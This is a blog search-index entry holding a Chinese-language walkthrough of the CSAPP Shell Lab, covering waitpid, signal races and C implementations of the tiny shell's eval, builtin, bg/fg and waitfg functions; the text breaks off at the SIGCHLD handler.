<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>csapp shlab</title>
    <link href="/2023/12/29/csapp-shlab/"/>
    <url>/2023/12/29/csapp-shlab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-shell-Lab"><a href="#CSAPP-shell-Lab" class="headerlink" title="CSAPP shell Lab"></a>CSAPP shell Lab</h1><p>Lab Assignment L5: **Writing Your Own Unix Shell! **</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>The purpose of this assignment is to become more familiar with the concepts of <strong>process control and signalling</strong>. You’ll do this by writing a simple Unix shell program that supports job control. </p><p>Looking at the tsh.c (tiny shell) file, you will see that it contains a functional skeleton of a simple Unix shell. To help you get started, we have already implemented the less interesting functions. Your assignment is to complete the remaining empty functions listed below. As a sanity check for you, we’ve listed the approximate number of lines of code for each of these functions in our reference solution (which includes lots of comments).</p><ul><li>eval: Main routine that parses and interprets the command line. [70 lines] 解析命令行</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines] 检测是否为内置命令<code>quit</code>、<code>fg</code>、<code>bg</code>、<code>jobs</code></li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines] 实现内置命令<code>fg</code>、<code>bg</code></li><li>waitfg: Waits for a foreground job to complete. [20 lines] 等待前台作业执行完成</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]  处理<code>SIGCHILD</code>信号，即子进程停止或者终止</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines] 处理<code>SIGINT</code>信号，即键盘中断<code>ctrl-c</code> </li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]处理<code>SIGSTP</code>信号，即来自终端的停止信号</li></ul><h3 id="The-tsh-Specification"><a href="#The-tsh-Specification" class="headerlink" title="The tsh Specification"></a>The <code>tsh</code> Specification</h3><p>Your tsh shell should have the following features:</p><ul><li><p>The prompt should be the string “tsh&gt; ”. </p></li><li><p>The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If <code>name</code> is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that <code>name</code> is the path of an executable file, which it loads and runs in the context of an initial child process (In this context, the term job refers to this initial child process). </p></li><li><p>tsh need not support pipes (|) or I&#x2F;O redirection (&lt; and &gt;).</p></li><li><p>Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p></li><li><p>If the command line ends with an ampersand &amp;, then tsh should run the job in the background. Otherwise, it should run the job in the foreground.</p></li><li><p>Each job can be <strong>identified by either a process ID</strong> (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the prefix ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.) </p></li><li><p>tsh should support the following built-in commands: </p><p>​– The quit command terminates the shell. </p><p>​– The jobs command lists all background jobs. </p><p>​– The bg  command restarts  by sending it a SIGCONT signal, and then runs it in the background. The  argument can be either a PID or a JID. </p><p>​– The fg  command restarts  by sending it a SIGCONT signal, and then runs it in the foreground. The  argument can be either a PID or a JID. </p></li><li><p>tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></li></ul><h2 id="开始冻手"><a href="#开始冻手" class="headerlink" title="开始冻手"></a>开始冻手</h2><h3 id="Revisit-回收子进程"><a href="#Revisit-回收子进程" class="headerlink" title="Revisit: 回收子进程"></a>Revisit: 回收子进程</h3><p>一个终止了但还未被回收的进程称为僵死进程。对于一个长时间运行的程序（比如 Shell）来说，内核不会安排<code>init</code>进程去回收僵死进程，而它虽不运行却仍然消耗系统资源，因此实验要求我们回收所有的僵死进程。</p><p><code>waitpid</code>是一个非常重要的函数，一个进程可以调用<code>waitpid</code>函数来等待它的子进程终止或停止，从而回收子进程，在本实验大量用到，我们必须学习它的用法：</p><ul><li>子进程终止</li><li>子进程收到信号停止</li><li>子进程收到信号重新执行</li></ul><p>如果一个子进程在调用之前就已经终止了，那么函数就会立即返回，否则，就会阻塞，直到一个子进程改变状态。</p><p>等待集合以及监测那些状态都是用函数的参数确定的，函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pid_t</span> <span class="hljs-title function_">waitpid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> *wstatus, <span class="hljs-type">int</span> options)</span>;<br></code></pre></td></tr></table></figure><p>各参数含义及使用</p><ul><li><strong>pid：判定等待集合成员</strong><ul><li>pid &gt; 0 : 等待集合为 pid 对应的单独子进程</li><li>pid &#x3D; -1: 等待集合为所有的子进程</li><li>pid &lt; -1: 等待集合为一个进程组，ID 为 pid 的绝对值</li><li>pid &#x3D; 0 : 等待集合为一个进程组，ID 为调用进程的 pid</li></ul></li><li><strong>options：修改默认行为</strong><ul><li>WNOHANG：集合中任何子进程都未终止，立即返回 0</li><li>WUNTRACED：阻塞，直到一个进程终止或停止，返回 PID</li><li>WCONTINUED：阻塞，直到一个停止的进程收到 SIGCONT 信号重新开始执行</li><li>也可以用或运算把 options 的选项组合起来。例如 WNOHANG | WUNTRACED 表示：立即返回，如果等待集合中的子进程都没有被停职或终止，则返回值为 0；如果有一个停止或终止，则返回值为该子进程的 PID</li></ul></li><li><strong>statusp：检查已回收子进程的退出状态</strong><ul><li>waitpid 会在 status 中放上关于导致返回的子进程的状态信息</li></ul></li></ul><h3 id="Revisit-并发编程原则"><a href="#Revisit-并发编程原则" class="headerlink" title="Revisit: 并发编程原则"></a>Revisit: 并发编程原则</h3><ol><li>保存和恢复errno。很多函数会在出错时设置errno，在处理程序中调用这样的函数可能会告饶主程序中其他依赖于errno的部分，解决办法是在进入处理函数时用局部变量保存它，运行完成后再将其恢复</li><li>访问全局数据时，阻塞所有信号。</li><li>不可以用信号来对其它进程中发生的事情计数。未处理的信号是不排队的，即每种类型的信号最多只能有一个待处理信号。<strong>举例</strong>：如果父进程将要接受三个相同的信号，当处理程序还在处理一个信号时，第二个信号就会加入待处理信号集合，如果此时第三个信号到达，那么它就会被简单地丢弃，从而出现问题</li><li>注意考虑同步错误：竞争。</li></ol><h3 id="Revisit-竞争"><a href="#Revisit-竞争" class="headerlink" title="Revisit: 竞争"></a>Revisit: 竞争</h3><p>  <img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181620016.png" alt="竞争的示例"></p><p>这是一个 Unix Shell 的框架，父进程在一个全局列表中记录子进程，并设置了一个 SIGCHLD 处理程序来回收子进程，乍一看没问题，但是考虑如下可能的事件序列：</p><ul><li>第 29 行，创建子进程运行</li><li>假设子进程在父进程运行到 32 行，即运行<code>addjob</code>函数之前就结束了，并发送一个 SIGCHLD 信号</li><li>父进程接收到信号，运行信号处理程序，调用<code>deletejob</code>函数，而这个<code>job</code>本来就没有添加入列表</li><li>返回父进程，调用<code>addjob</code>函数，而这个子进程已经终止并回收了，<code>job</code>早就不存在了</li></ul><p>也就是说，在这里，<code>deletejob</code>函数的调用发生在了<code>addjob</code>之前，导致错误。我们称<code>addjob</code>和<code>deletejob</code>存在竞争。</p><p>解决方法即在父进程<code>folk</code>之前就阻塞SIGCHLD信号</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181638081.png" alt="解决方法"></p><h3 id="错误处理包装函数"><a href="#错误处理包装函数" class="headerlink" title="错误处理包装函数"></a>错误处理包装函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Error wrapper function */</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *oldset)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigemptyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigaddset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> signum)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">pid_t</span> pgid)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> sig)</span>;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *oldset)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigprocmask(how, <span class="hljs-built_in">set</span>, oldset) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigemptyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigemptyset(<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigfillset(<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigfillset error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigaddset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> signum)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sigaddset(<span class="hljs-built_in">set</span>, signum) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigaddset error&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>&#123;<br>    <span class="hljs-keyword">if</span>(execve(filename, argv, envp) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">pid_t</span> pgid)</span>&#123;<br>    <span class="hljs-keyword">if</span>(setpgid(pid, pgid) &lt; <span class="hljs-number">0</span>)&#123;<br>        unix_error(<span class="hljs-string">&quot;Setpid error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> sig)</span>&#123;<br>    <span class="hljs-keyword">if</span>(kill(pid, sig) &lt; <span class="hljs-number">0</span>)&#123;<br>        unix_error(<span class="hljs-string">&quot;Kill error&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>解析命令行，判断其是内置命令，还是程序路径，分别执行，如果是前台作业，要等待其完成，如果是后台作业，则要输出其相应信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS];        <span class="hljs-comment">//存放解析的参数</span><br>    <span class="hljs-type">char</span> buf[MAXLINE];          <span class="hljs-comment">//解析cmdline</span><br>    <span class="hljs-type">int</span> bg;                     <span class="hljs-comment">//判断程序是前台还是后台执行</span><br>    <span class="hljs-type">int</span> state;                  <span class="hljs-comment">//指示前台还是后台运行状态</span><br>    <span class="hljs-type">pid_t</span> pid;                  <span class="hljs-comment">//执行程序的子进程的pid</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);   <br>    bg = parseline(buf, argv);  <span class="hljs-comment">//解析参数</span><br>    state = bg? BG:FG;          <br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)         <span class="hljs-comment">//空行，直接返回</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">sigset_t</span> mask_all, mask_one, prev_one;<br>    Sigfillset(&amp;mask_all);<br>    Sigemptyset(&amp;mask_one);<br>    Sigaddset(&amp;mask_one, SIGCHLD);<br>    <span class="hljs-keyword">if</span>(!builtin_cmd(argv)) &#123;                            <span class="hljs-comment">//判断是否为内置命令</span><br>        Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);       <span class="hljs-comment">//fork前阻塞SIGCHLD信号</span><br>        <span class="hljs-keyword">if</span>((pid = Fork()) == <span class="hljs-number">0</span>) &#123;                           <span class="hljs-comment">//创建子进程</span><br>            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);      <span class="hljs-comment">//解除子进程的阻塞</span><br>            Setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);                                  <span class="hljs-comment">//创建新进程组，ID设置为进程PID</span><br>            Execve(argv[<span class="hljs-number">0</span>], argv, environ);                 <span class="hljs-comment">//执行</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);                                        <span class="hljs-comment">//子线程执行完毕后一定要退出</span><br>        &#125;<br>        <span class="hljs-keyword">if</span>(state==FG)&#123;<br>            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);            <span class="hljs-comment">//添加工作前阻塞所有信号</span><br>            addjob(jobs, pid, state, cmdline);                  <span class="hljs-comment">//添加至作业列表</span><br>            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="hljs-literal">NULL</span>);<br>            waitfg(pid);                                        <span class="hljs-comment">//等待前台进程执行完毕</span><br>        &#125;         <br>        <span class="hljs-keyword">else</span>&#123;<br>            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>);            <span class="hljs-comment">//添加工作前阻塞所有信号</span><br>            addjob(jobs, pid, state, cmdline);                  <span class="hljs-comment">//添加至作业列表</span><br>            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="hljs-literal">NULL</span>);                                 <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid), pid, cmdline);  <span class="hljs-comment">//打印后台进程信息</span><br>        &#125;<br>        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>);          <span class="hljs-comment">//解除阻塞 </span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><p>判断是否为内置命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>)) &#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>)) &#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&amp;&quot;</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h3><p>实现内置命令bg和fg，这两个命令的功能如下：</p><ul><li><code>bg &lt;job&gt;</code>：通过向<code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在后台运行</li><li><code>fg &lt;job&gt;</code>：通过向 <code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在前台运行</li><li>输入时后面的参数有<code>%</code>则代表<code>jid</code>，没有则代表<code>pid</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">//要处理的job</span><br>    <span class="hljs-type">int</span> state;                      <span class="hljs-comment">//输入的命令</span><br>    <span class="hljs-type">int</span> id;                         <span class="hljs-comment">//存储jid或pid</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>)) state = BG;<br>        <span class="hljs-keyword">else</span> state = FG;  <br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>]==<span class="hljs-literal">NULL</span>)&#123;               <span class="hljs-comment">//没带参数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;             <span class="hljs-comment">//说明是jid</span><br>       <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="hljs-number">0</span>)&#123;<br>            job = getjobjid(jobs, id);  <span class="hljs-comment">//获得job</span><br>            <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%%%d: No such job\n&quot;</span>, id);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) &#123;  <span class="hljs-comment">//其它符号，非法输入</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;                       <span class="hljs-comment">//pid</span><br>        id = atoi(argv[<span class="hljs-number">1</span>]);<br>        job = getjobpid(jobs, id);<br>        <span class="hljs-keyword">if</span>(job==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>    &#125;<br>    Kill(-(job-&gt;pid), SIGCONT);       <span class="hljs-comment">//重启进程, 这里发送到进程组</span><br>    job-&gt;state = state;<br>    <span class="hljs-keyword">if</span>(state==BG)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    <span class="hljs-keyword">else</span> <br>        waitfg(job-&gt;pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>该函数从要求实现阻塞父进程，直到当前的前台进程不再是前台进程了。这里显然要显式的等待信号</p><p>解决方法是用sleep函数或sigsuspend函数，该函数相当于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);<br>pause();<br>sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>在调用<code>sigsuspend</code>之前阻塞 SIGCHLD 信号，调用时又通过<code>sigprocmask</code>函数，在执行<code>pause</code>函数之前解除对信号的阻塞，从而正常休眠。有同学可能会问了：这里并没有消除竞争啊？如果在第 1 行和第 2 行之间子进程终止不还是会发生永久休眠吗？</p><p>这就是<code>sigsuspend</code>与上述代码的不同之处了，它相当于上述代码的原子版本，即第 1 行和第 2 行总是一起发生的，不会被中断！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">sigset_t</span> mask;<br>    <span class="hljs-built_in">Sigemptyset</span>(&amp;mask);   <br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fgpid</span>(jobs) != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">sigsuspend</span>(&amp;mask);      <span class="hljs-comment">//暂停时取消阻塞,见sigsuspend用法</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="信号处理函数"><a href="#信号处理函数" class="headerlink" title="信号处理函数"></a>信号处理函数</h3><h4 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h4><p>回收所有僵死进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 